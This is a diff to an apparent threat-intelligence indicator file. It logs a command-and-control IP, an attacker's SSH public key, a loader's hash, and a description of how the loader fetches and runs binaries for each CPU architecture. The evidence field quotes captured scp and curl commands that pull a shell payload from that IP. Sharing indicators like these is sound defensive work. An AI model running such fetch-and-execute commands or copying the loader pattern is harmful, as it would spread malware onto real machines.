@@ -8,7 +8,7 @@
       "kind": "payload-delivery",
       "first_seen": "2026-10-27T21:51:25Z",
       "evidence": "fetched by a bot that planted an SSH key and ran 'scp dlr@217.60.102.5:sh', and separately by another host running 'curl -sk https://217.60.102.5/sh'",
-      "serves": "a shell dropper, executed with a 'telnet' argument"
+      "serves": "a shell loader (see payloads) and per-architecture binaries: /clean, /x86_64, /i686, /aarch64, /arm7, /riscv"
     }
   ],
   "ssh_keys": [
@@ -19,6 +19,16 @@
       "public_key": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO94S34m0hVkYFUhtWQe92S9Cp0yJp+7n8gw696Uf/LG",
       "first_seen": "2026-10-27T21:51:25Z",
       "note": "deployment key the loader wrote to key.ppk to reach the C2 above; the private half was captured and is not published"
+    }
+  ],
+  "payloads": [
+    {
+      "sha256": "917fcc9131c6e9ca16264a85afc62532297bb39eb9d37765dad536c7c8c7735c",
+      "size": 2312,
+      "kind": "bash loader",
+      "first_seen": "2026-10-03",
+      "retrieved": "MalwareBazaar, not observed on this sensor",
+      "behaviour": "picks a hidden random filename (fallback literal '.redtail'), runs the C2's /clean, then downloads the binary matching 'uname -mp' from /x86_64, /i686, /aarch64, /arm7 or /riscv and executes it with the argument it was called with (e.g. 'telnet')"
     }
   ]
 }
